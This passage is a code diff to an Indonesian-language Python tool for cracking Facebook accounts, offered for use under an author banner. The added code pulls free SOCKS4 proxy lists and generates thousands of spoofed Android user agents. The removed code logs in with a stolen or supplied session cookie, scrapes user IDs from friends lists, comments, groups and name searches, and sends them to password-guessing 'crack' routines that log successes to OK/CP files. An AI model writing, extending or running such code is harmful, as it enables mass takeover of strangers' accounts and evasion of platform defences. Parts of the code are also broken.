@@ -1,999 +1,772 @@
-###----------[ IMPORT MODULE LAIN ]---------- ###
-import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess
-from concurrent.futures import ThreadPoolExecutor
-from bs4 import BeautifulSoup as parser
-from datetime import date,datetime
-from requests.exceptions import ConnectionError
-ses = requests.Session()
-
-###----------[ IMPORT MODULE RICH ]---------- ###
-from rich.panel import Panel
-from rich.tree import Tree
-from rich import print as prints
-from rich.console import Console
-from rich.table import Table
-from rich.columns import Columns
+###----------[ IMPORT MODULE ]----------###
+import requests,json,os,sys,random,datetime,time,re,platform
 from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
-console = Console()
+from concurrent.futures import ThreadPoolExecutor as tred
+from time import sleep as waktu
+from rich.console import Console as sol
+###----------[ GLOBAL NAMA ]----------###
+id,id2,uid = [],[],[]
+xbz,xnxx = [],[]
+tokenefb = []
+tokene = []
+akunyeh = []
+ugen = []
+usrgent2 = []
+loop,baz = 0,[]
+ok,cp,oo = 0,0,[]
+ualu,ualuh = [],[]
+pwpluss, pwnya = [],[]
+ses = requests.Session()
+###----------[ GET PROXY ]----------###
+try:
+	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+	open('socksku.txt','w').write(proxylist)
+except Exception as e:
+	baz_anim(f'gagal ster :(')
+proxsi=open('socksku.txt','r').read().splitlines()
 
-###----------[ WARNA PRINT RICH ]---------- ###
+###----------[ USER AGENT 1 ]----------###
+for agenku in range(100):
+	rc = random.choice
+	rr = random.randint
+	ugen.append(rc([f"Mozilla/5.0 (Linux; U) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(30,114))}.0.{str(rr(3000,5555))}.{str(rr(30,150))} Mobile Safari/537.36 (SmartTV/8.5) (NetCast) (Android)"]))
+print(ugen)
+time.sleep(3)
+###----------[ USER AGENT 2 ]----------###
+for agenku in range(10000):
+    rr = random.randint; rc = random.choice
+    nomor = str(rc(['7.1.1','7.0','8.1.0','8.0.0','6.0','8','9','10','11','12','13','14','15']))
+    a = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
+    b = (f"{str(rc(a))}{str(rc(a))}{str(rc(a))}{str(rr(11,99))}{str(rc(a))}")
+    a = str(rc(['PKQ1','QP1A','RP1A','QKQ1','PPR1','SP1A','TP1A','OPM1','RKQ1','SKQ1','TKQ1','UKQ1','01AQKQ1','QQ3A','QD4A','QQ1B','OPR1']))
+    b = (f"{str(rr(5000,299999))}")
+    c = str(rc(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020','021','022','023','024','025','026','027','028','029','030','031','032','033','034','035','036','037','039','040','041','042','043','044','045','046','047','048','049','050','051','052','053','054','055','056','057','058','059','060','061','062','063','064','065','066','067','068','069','070','071','072','073','074','075','076','077','079','080']))
+    kombinasi = (f"{a}.{b}.{c}")
+    OP = str(rc(["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]))
+    SM = str(rc(['SM-A015M','SM-A013M','SM-A022F','SM-A025G','SM-A035M','SM-A032M','SM-A037M','SM-A045F','SM-A042F','SM-A047F','SM-A105M','SM-S102DL','SM-A107M','SM-A115AP','SM-A125U','SM-A135F','SM-A136U','SM-A145R','SM-A146U','SM-A205S','SM-A202F','SM-A207F','SM-A215U','SM-A217F','SM-A225M','SM-A226B','SM-A235M','SM-A236U','SM-A245F','SM-A305FN',
+    'SM-A307GT','SM-A315F','SM-A325F','SM-A326B','SM-A336E','SM-A346B','SM-A430F','SM-A405FN','SM-E236B','SM-S367VL','SM-J400M','SM-J530F','SM-J530G','SM-J600FN','SM-J610F','SM-S767VL','SM-A202K','SM-M015G','SM-M017F','SM-M127F','SM-N950U','SM-N9300','SM-N960F','SM-9005','SM-N981B','SM-N985F','SM-N770F','SM-N970F']))
+    RM = str(rc(["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]))
+    RD = str(rc(["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]))
+    ua0 = f'Mozilla/5.0 (Linux; U; Android {nomor}; en-us; {OP} Build/{b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(53,119))}.0.{str(rr(2500,8000))}.{str(rr(134,299))} Mobile Safari/537.36 OppoBrowser/{str(rr(1,9))}.{str(rr(1,9))}.1'
+    ua1 =f'Mozilla/5.0 (Linux; Android {str(rr(8,15))}; {SM} Build/{kombinasi}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(76,121))}.0.{str(rr(5000,10000))}.{str(rr(18,299))} Mobile Safari/537.3'
+    ua2 =f'Mozilla/5.0 (Linux; U; Android {str(rr(9,15))}; en-us; {RM} Build/{kombinasi}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(53,119))}.0.{str(rr(2500,8000))}.{str(rr(134,299))} Mobile Safari/537.36 RealmeBrowser/{str(rr(1,35))}.{str(rr(1,5))}.0.{str(rr(1,8))}'
+    ua4 =f'Mozilla/5.0 (Linux; U; Android {str(rr(8,15))}; zh-cn; {RD} Build/{kombinasi}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(109,119))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(10,19))}.{str(rr(1,9))}.{str(rr(100000,500000))}'
+    CO = rc([ua0,ua1,ua2,ua4])
+    ugen.append(CO)
+	
+###----------[ PEWARNA ]----------###
+puti = '\x1b[1;97m'# --> WARNA-PUTIH
+mer = '\x1b[1;91m' # --> WARNA-MERAH
+kun = '\x1b[1;93m' # --> WARNA-KUJING
+hijo = '\x1b[1;92m'# --> WARNA-HIJAU
+ung = '\x1b[1;95m' # --> WARNA-UNGU
+biru = '\x1b[1;94m'# --> WARNA-BIRU
+xxx = '\33[m'
+P = '\x1b[1;97m'
+KON='\x1b[38;5;46m'
+M = '\x1b[1;91m'
+H = '\x1b[1;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m'
+N = '\x1b[0m'    
+Z = "\033[1;30m"
+x = '\33[m'         # --> DEFAULT
+m = '\x1b[1;91m'    # --> RED +
+k = '\033[93m'      # --> KUNING +
+h = '\x1b[1;92m'    # --> HIJAU +
+hh = '\033[32m'     # --> HIJAU -
+u = '\033[95m'      # --> UNGU
+kk = '\033[33m'     # --> KUNING -
+b = '\33[1;96m'     # --> BIRU -
+p = '\x1b[0;34m'    # --> BIRU +
+#----------> WARNA-RICH
 M2 = "[#FF0000]" # MERAH
 H2 = "[#00FF00]" # HIJAU
 K2 = "[#FFFF00]" # KUNING
 B2 = "[#00C8FF]" # BIRU
 P2 = "[#FFFFFF]" # PUTIH
-U2 = "[#AF00FF]" # UNGU
-O2 = "[#FF8F00]" # ORANGE
+        
+###----------[ CONVERT BULAN ]----------###
+rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
+tg = datetime.datetime.now().day
+bl = rb[(str(datetime.datetime.now().month))]
+th = datetime.datetime.now().year
+okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
+cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
 
-###----------[ GLOBAL NAMA ]---------- ###
-sekarang = calendar.timegm(time.gmtime(time.time()))
-tampung = []
-ugent = []
-ugen = []
-hakix = []
+###----------[ UNTUK ANIMASI ]----------###
+def baz_anim(berjalan):
+        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.05)
+def baz_bann(berjalan):
+        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.01)
+def clear():
+	os.system('clear')
+def back():
+	login_baz()
+     
+###----------[ BANNER MENUH ]----------###
+def banner():
+	os.system('clear')
+	print(f'''{hijo}
+  /$$$$$$   /$$$$$$  /$$$$$$$  /$$$$$$$   /$$$$$$ 
+ /$$__  $$ /$$__  $$| $$__  $$| $$__  $$ /$$__  $$
+| $$  \__/| $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$
+| $$      | $$  | $$| $$$$$$$ | $$$$$$$/| $$$$$$$$
+| $$      | $$  | $$| $$__  $$| $$__  $$| $$__  $$
+| $$    $$| $$  | $$| $$  \ $$| $$  \ $$| $$  | $$
+|  $$$$$$/|  $$$$$$/| $$$$$$$/| $$  | $$| $$  | $$
+ \______/  \______/ |_______/ |__/  |__/|__/  |__/
+{puti}''')
 
-###----------[ CEK WARNA TEMA ]---------- ###
-try:
-	file_color = open("data/theme_color","r").read()
-	color_text = file_color.split("|")[0]
-	color_panel = file_color.split("|")[1]
-except:
-	color_text = "[#00FF00]"
-	color_panel = "#FF0000"
-	color_ok = "#00FF00"
-	color_cp = "#FFFF00"
-	
-###----------[ GET DATA DARI DEVICE ]---------- ###
-# android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
-# try:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
-# except:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
-versi_app = str(random.randint(111111111,999999999))
-
-###----------[ GENERATE USERAGENT ]---------- ###
-for z in range(200):
-	rr = random.randint
-	versi_android = str(random.randint(4,12))+".0.0"
-	versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
-	device = random.choice(["Nexus 5 Build/NHG47L","Nexus 7 Build/LMY47V","Nexus 5X Build/N4F26T","Nexus 6P Build/OPM5.171019.014","Nexus 5X Build/OPR6.170623.023","Nexus 6 Build/OPM5.171019.015","Nexus 5X Build/MMB29K","Nexus 5X Build/OPM6.171019.030.H1"])
-	dev = device.split(" Build/")[0]
-	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
-	build = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
-	versi_app = random.randint(410000000,499999999)
-	device_v = random.choice(["VOG-L29 Build/HUAWEIVOG-L29","STK-LX3 Build/HUAWEISTK-LX3","BTV-W09 Build/HUAWEIBEETHOVEN-W09","CLT-AL00 Build/HUAWEICLT-AL00","LYA-AL10 Build/HUAWEILYA-AL10","ELE-L29 Build/HUAWEIELE-L29","DIG-AL00 Build/HUAWEIDIG-AL00","EVA-L09 Build/HUAWEIEVA-L09"])
-	density = random.choice(["{density=3.0,width=1080,height=1920}","{density=2.0,width=720,height=1412}","{density=1.5, width=480, height=800}"])
-	ua_1 = f"Mozilla/5.0 (Linux; U; Android {versi_android}; {device_v}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/{versi_android};FBCA/armeabi-v7a:armeabi;FBDM/{density};]"
-	ua_2 = f"Mozilla/5.0 (Linux; Android {versi_android}; {device}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
-	ua_3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(9,13))}; {device}) [FBAN/MessengerLite;FBAV/{str(rr(40,375))}.309.0.0.8.61;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/434647565;FBCR/AXIS;FBMF/Vision;FBBD/Vision;FBDV/Vision3;FBSV/{str(rr(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.54375,width=720,height=1600};]"
-	ua = random.choice([ua_1,ua_2,ua_3])
-	if ua in ugent:pass
-	else:ugent.append(ua)
-
-###----------[ KETERANGAN WAKTU ]---------- ###
-def tahun(fx):
-	if len(fx)==15:
-		if fx[:10] in ['1000000000']       :tahunz = '2009'
-		elif fx[:9] in ['100000000']       :tahunz = '2009'
-		elif fx[:8] in ['10000000']        :tahunz = '2009'
-		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
-		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
-		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
-		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
-		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
-		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
-		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
-		elif fx[:6] in ['100009']          :tahunz = '2015'
-		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
-		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
-		elif fx[:5] in ['10003']           :tahunz = '2018'
-		elif fx[:5] in ['10004']           :tahunz = '2019'
-		elif fx[:5] in ['10005']           :tahunz = '2020'
-		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
-		else:tahunz=''
-	elif len(fx) in [9,10]:
-		tahunz = '2008-2009'
-	elif len(fx)==8:
-		tahunz = '2007-2008'
-	elif len(fx)==7:
-		tahunz = '2006-2007'
-	else:tahunz=''
-	return tahunz
-dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
-dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
-tgl = datetime.now().day
-bln = dic[(str(datetime.now().month))]
-thn = datetime.now().year
-okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-def CetakBanner(ulfahsadiyah,asu):
-    Console(width=100).print(Panel(ulfahsadiyah,style='red'),justify='center')
-def whoami(kaya,kontol):
-    Console(width=100).print(Panel(kaya,style='red'),justify='center')
-    
-def ua_krek():
-	rr = random.randint
-	model = random.choice(['RMX2052','RMX2072'])
-	ua = (f"Mozilla/5.0 (Linux; U; Android {str(rr(9,13))}; Vision3 Build/MRA58K) [FBAN/MessengerLite;FBAV/{str(rr(40,375))}.309.0.0.8.61;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/434647565;FBCR/AXIS;FBMF/Vision;FBBD/Vision;FBDV/Vision3;FBSV/{str(rr(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.54375,width=720,height=1600};]")
-	return ua
-###-----------------[]-----------------###
-def licensi():
-	CetakBanner(f"""[green]
-   __ _                    _ 
-  / /(_) ___ ___ _ __  ___(_)
- / / | |/ __/ _ \ '_ \/ __| |
-/ /__| | (_|  __/ | | \__ \ |
-\____/_|\___\___|_| |_|___/_|
-""",'color(8)')
-                             
-###----------[ LOGO AUTHOR DAN VERSI]---------- ###
-class Logo:
-	
-	###----------[ BERSIHKAN LAYAR ]---------- ###
-	def bersihkan_layar(self):
-		if "linux" in sys.platform.lower():
-			try:os.system("clear")
-			except:pass
-		elif "win" in sys.platform.lower():
-			try:os.system("cls")
-			except:pass
-		else:
-			try:os.system("clear") 
-			except:pass
-
-	###----------[ LOGO ]---------- ###
-	def logonya(self):
-		self.bersihkan_layar()
-		prints(Panel(f"""{M2}⬤  {H2}⬤  {K2}⬤{color_text}
-		
-╔═╗╔═╗───────────╔╗──╔╗╔═╗
-║║╚╝║║───────────║║──║║║╔╝
-║╔╗╔╗╠══╦══╦══╦╗╔╣╚═╗║╚╝╝╔╗╔╦══╗
-║║║║║║╔╗║╔═╣╔═╣║║║╔╗║║╔╗║║║║║╔╗║
-║║║║║║╔╗║╚═╣╚═╣╚╝║╚╝║║║║╚╣╚╝║║║║
-╚╝╚╝╚╩╝╚╩══╩══╩══╩══╝╚╝╚═╩══╩╝╚╝
-                                                                    
-
-""",width=87,style=f"{color_panel}"))
-
-###----------[ BAGIAN LOGIN ]---------- ###
-class Login:
-	
-	###----------[ FUNCTION INIT ]---------- ###
-	def __init__(self):
-		self.ip = ses.get("http://ip-api.com/json/").json()["query"]
-		self.negara = ses.get("http://ip-api.com/json/").json()["country"]
-
-	###----------[ MENU LOGIN ]---------- ###
-	def menu_login(self):
-		Logo().logonya()
-		prints(Panel(f"{H2}\t                        Menu Login",width=87,style=f"{color_panel}"))
-		prints(Panel(f"""{P2}[{color_text}01{P2}]. login menggunakan cookie facebook ( {H2}Recomended{P2} )\n[{color_text}02{P2}]. login menggunakan No dan Password ( {M2}No Recomended{P2} )""",width=87,style=f"{color_panel}"))
-		login = console.input(f" {H2}• {P2}pilih menu : ")
-		if login in["1","01"]:
-			prints(Panel(f"""{P2}silahkan masukan cookiemu disini dan pastikan autentikasi tidak aktif""",width=87,style=f"{color_panel}"))
-			cookie = console.input(f" {H2}• {P2}masukan cookie : ")
-			#open("data/cookie","w").write(cookie)
-			self.login_cookie(cookie)
-		else:
-			exit(prints(Panel(f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",width=87,style=f"{color_panel}")))
-			
-	###----------[ LOGIN COOKIE ]---------- ###
-	def login_cookie(self,cookie):
-		try:
-			url = ses.get("https://mbasic.facebook.com/",cookies={"cookie": cookie}).text
-			if "Apa yang Anda pikirkan sekarang" in url:
-				pass
-			else:
-				for z in url.find_all("a",href=True):
-					if "Tidak, Terima Kasih" in z.text:
-						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies=cookie)
-						parsing = parser(get.text,"html.parser")
-						action = parsing.find("form",{"method":"post"})["action"]
-						data = {
-							"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get.text)).group(1),
-							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
-							"submit": "OK, Gunakan Data"
-						}
-						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies=cookie)
-						break
-			open("data/cookie","w").write(cookie)
-			Menu().menu()
-		except:
-			prints(Panel(f"""{M2}cookie invalid, silahkan gunakan cookie lain yang masih baru atau fresh""",width=87,style=f"{color_panel}"))
-			sys.exit()
-		
-	###----------[ UBAH BAHASA ]---------- ###
-	def ubah_bahasa(self,cookie):
-		try:
-			url = ses.get("https://mbasic.facebook.com/language/",cookies={"cookie": cookie})
-			parsing = parser(url.text,"html.parser")
-			for x in parsing.find_all("form",{"method":"post"}):
-				if "Bahasa Indonesia" in str(x):
-					data = {
-						"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),
-						"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),
-						"submit"  : "Bahasa Indonesia"
-					}
-					post = ses.post("https://mbasic.facebook.com"+x["action"],data=data,cookies={"cookie": cookie})
-		except:
-			pass
-		
-###----------[ BAGIAN MENU ]---------- ###
-class Menu:
-	
-	###----------[ FUNCTION INIT ]---------- ###
-	def __init__(self):
-		self.men = []
-		self.id = []
-		self.ip = ses.get("http://ip-api.com/json/").json()["query"]
-		self.negara = ses.get("http://ip-api.com/json/").json()["country"]
-
-	###----------[ CEK INFO LOGIN ]---------- ###
-	def cek_login(self,cookie):
-		try:
-			url = ses.get("https://mbasic.facebook.com/profile.php",cookies=cookie).text
-			nama = re.findall("<title>(.*?)</title>",url)[0]
-			if "Konten Tidak Ditemukan" in nama:
-				try:os.remove("data/cookie")
-				except:pass
-				Login().menu_login()
-			else:
-				return nama
-		except ConnectionError:
-			prints(Panel(f"""{M2}koneksi internet kamu bermasalah, silahkan cek koneksi kamu kembali""",width=87,style=f"{color_panel}"))
-			exit()
-			
-	###----------[ MENU UTAMA ]---------- ###
-	def menu(self):
-		Logo().logonya()
-		
-		###----------[ GET COOKIE DAN DATA ]---------- ###
-		try:
-			cok = open("data/cookie","r").read()
-			cookie = {"cookie": cok}
-			nama = self.cek_login(cookie)
-		except:
-			try:os.remove("data/cookie")
-			except:pass
-			Login().menu_login()
-		
-		###----------[ PANEL BIASA ]---------- ###
-		pornhub = []
-		yonkou = []
-		self.jol = Console()
-		self.tol = Console()
-		prints(Panel(f"{K2}        {self.negara}",width=87,padding=(0,30),title=f"{M2}• {H2}• {K2}• {H2}Negara {M2}• {H2}• {K2}•",subtitle=f"{M2}• {H2}• {K2}• {H2}Version : 0.5{M2} • {H2}• {K2}•",style=f"{color_panel}"))
-		yonkou.append(Panel(f" {K2}Nama Akun       {P2}: {H2}{nama}\n {K2}Status Pengguna {P2}: {H2} Spesial\n {K2}Ip Address      {P2}: {H2}{self.ip}\n {K2}Tanggal         {P2}: {H2}{tgl}",width=43,padding=(0,2),title=f"{M2}• {H2}• {K2}• {K2}Info-User {M2}• {H2}• {K2}•",style=f"{color_panel}"))
-		yonkou.append(Panel(f" {K2}Author   {P2}: {H2}Mvb\n {K2}Github  {P2} : {H2}Maccubgans\n{K2} Facebook {P2}: {H2}MaccubKun\n{K2} Whatsapp {P2}: {H2}+62*************",width=43,padding=(0,2),title=f"{M2}• {H2}• {K2}• {K2}Info-Author {M2}• {H2}• {K2}•",style=f"{color_panel}"))
-		self.jol.print(Columns(yonkou))
-		prints(Panel(f"{H2}\t                           Daftar Menu",width=87,style=f"{color_panel}"))
-		pornhub.append(Panel(f"{P2}[{color_text}01{P2}]. crack {K2}dari {H2}id publik\n{P2}[{color_text}02{P2}]. crack {K2}dari {H2}pengikut\n{P2}[{color_text}03{P2}]. crack {K2}dari {H2}komentar\n{P2}[{color_text}04{P2}]. crack {K2}dari {H2}random email",width=43,padding=(0,2),style=f"{color_panel}"))
-		pornhub.append(Panel(f"{P2}[{color_text}05{P2}]. crack {K2}dari {H2}pencarian nama\n{P2}[{color_text}06{P2}]. crack {K2}dari {H2}member grup\n{P2}[{color_text}07{P2}]. crack {K2}dari {H2}file sendiri\n{P2}[{color_text}08{P2}]. cek {K2}opsi {H2}checkpoint",width=43,padding=(0,2),style=f"{color_panel}"))
-		self.tol.print(Columns(pornhub))
-		prints(Panel(f"""{P2}   ketik {M2}logout{P2} untuk hapus cookie dan ketik {H2}lain{P2} untuk ke menu lain""",width=87,padding=(0,6),style=f"{color_panel}"))
-		menu = console.input(f" {H2}• {P2}pilih menu : ")
-		
-		###------------[ logout ]------------###
-		if menu in["logout"]:
-			os.system("rm data/cookie")
-			exit(prints(Panel(f"""{H2}berhasil menghapus cookie, silahkan ketik ulang python run.py""",width=87,style=f"{color_panel}")))
-		###----------[ ID PUBLIK ]---------- ###
-		elif menu in["1","01"]:
-			prints(Panel(f"""{P2}     masukan id target, pastikan id target bersifat publik dan tidak private""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=87,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan id atau username : ")
-			if user in["Me","me"]:
-				user = Dump(cookie).GetUser()
-			Dump(cookie).Dump_Publik(f"https://mbasic.facebook.com/{user}?v=friends")
-			Crack().atursandi()
-			
-		###----------[ KOMENTAR ]---------- ###
-		elif menu in["3","03"]:
-			prints(Panel(f"""{P2}masukan id postingan, pastikan postingan bersifat publik dan tidak private""",width=87,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan id postingan : ")
-			Dump(cookie).Dump_Komentar(f"https://mbasic.facebook.com/{user}")
-			Crack().atursandi()
-			
-		###----------[ KOMENTAR ]---------- ###
-		elif menu in["4","04"]:
-			prints(Panel(f"""{P2}masukan nama untuk email, format email akan selalu @gmail.com""",width=87,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan nama : ")
-			limit = console.input(f" {H2}• {P2}masukan limit : ")
-			Dump(cookie).Dump_Email(user,limit)
-			Crack().atursandi()
-			
-		###----------[ PENCARIAN NAMA ]---------- ###
-		elif menu in["5","05"]:
-			prints(Panel(f"""{P2}kamu bisa menggunakan koma (,) sebagai pemisah jika lebih dari 1 nama""",width=87,style=f"{color_panel}"))
-			username = []
